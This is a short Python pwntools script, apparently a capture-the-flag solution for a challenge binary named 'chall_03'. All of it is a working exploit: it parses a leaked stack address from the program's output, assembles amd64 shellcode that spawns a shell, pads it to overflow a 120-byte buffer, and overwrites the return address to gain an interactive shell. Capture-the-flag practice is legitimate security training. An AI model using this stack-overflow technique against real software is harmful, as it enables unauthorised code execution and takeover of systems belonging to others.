from pwn import *
import re
context.arch = "amd64"
p=process("./chall_03")
p.recv()
p.sendline()
resp = p.recv()
shelladr = p64(int(re.findall(b"([a-f0-9]{8,16})", resp)[0],16))
shellcode = asm(shellcraft.amd64.sh())
payload = shellcode + b"a"*(112+8-len(shellcode))+shelladr
p.sendline(payload)
p.interactive()
